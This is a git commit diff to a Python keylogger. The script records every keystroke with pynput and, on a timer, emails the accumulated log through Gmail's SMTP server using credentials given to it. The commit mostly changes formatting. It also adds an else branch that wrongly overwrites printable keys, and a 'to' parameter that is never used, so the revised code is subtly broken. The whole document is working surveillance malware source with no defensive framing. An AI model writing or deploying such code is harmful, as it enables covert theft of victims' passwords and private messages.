9942e74ea96f1765e7f34f6256d4033434eba19a
Terrill Hilliard <119083888+terrillhilliard@users.noreply.github.com>
2023-01-27 19:43:58 -0600

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,9 @@
-#!/usr/bin/env.python
+#!/usr/bin/env python
 import pynput.keyboard
 import threading
 import smtplib
 
-class Keylogger:
+class keylogger:
     def __init__(self, time_interval, email, password):
         self.log = "Kelogger Started"
         self.interval = time_interval
@@ -14,33 +14,29 @@ class Keylogger:
         self.log = self.log + string
 
     def process_key_press(self, key):
-       try:
-           current_key = str(key.char)
-       except AttributeError:
-           if key == key.space:
-               current_key = " "
-           else:
-               current_key = " " + str(key) + " "
-       self.append_to_log(current_key)
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        else:
+            current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
     def report(self):
-        self.send_mail(self.email, self.password, self.log)
+        self.send_mail(self.email, self.password, self.email, self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
-
-
-    def send_mail(self, email, password, message):
+    def send_mail(self, email, password, to, message):
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
         server.quit()
-
-
-
-
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
